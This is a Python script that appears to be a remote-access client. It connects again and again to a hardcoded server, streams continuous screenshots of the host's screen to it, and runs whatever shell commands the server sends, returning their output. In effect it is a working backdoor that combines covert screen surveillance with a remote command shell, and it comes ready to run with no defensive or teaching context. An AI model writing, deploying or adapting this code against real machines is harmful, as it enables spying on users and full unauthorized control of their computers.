import socket
import cv2
import numpy as np
import pyautogui
import threading
import subprocess
import time

class VideoSender:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            try:
                self.client_socket.connect((self.server_ip, self.server_port))
                print("Connected to the server.")
                break
            except Exception as e:
                print(f"Connection failed: {e}. Retrying in 10 seconds...")
                time.sleep(10)

    def send_video(self):
        try:
            while True:
                # Capture screen and encode
                screen = pyautogui.screenshot()
                frame = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
                result, encoded_frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                frame_data = encoded_frame.tobytes()
                frame_size_bytes = len(frame_data).to_bytes(4, byteorder='big')
                self.client_socket.sendall(frame_size_bytes + frame_data)
                time.sleep(1 / 60)  # Target 60 FPS

        except Exception as e:
            print(f"Error during video sending: {e}")
        finally:
            self.client_socket.close()

    def receive_commands(self):
        while True:
            try:
                command = self.client_socket.recv(1024).decode("utf-8", errors='ignore')  # Ignore decoding errors
                if not command:
                    break

                # Execute the command and capture output
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                except subprocess.CalledProcessError as e:
                    output = e.output  # Get the output even if the command fails

                # Send output back to the server
                self.client_socket.sendall(output.encode("utf-8", errors='backslashreplace'))  # Use backslashreplace for bad bytes
            except Exception as e:
                error_message = f"Command error: {str(e)}"
                self.client_socket.sendall(error_message.encode("utf-8", errors='backslashreplace'))  # Handle error message encoding
                print(f"Error in command execution: {e}")

    def run(self):
        self.connect()
        threading.Thread(target=self.send_video).start()
        threading.Thread(target=self.receive_commands).start()

if __name__ == "__main__":
    client = VideoSender("192.168.0.190", 5555)  # Change to your server's IP and port
    client.run()
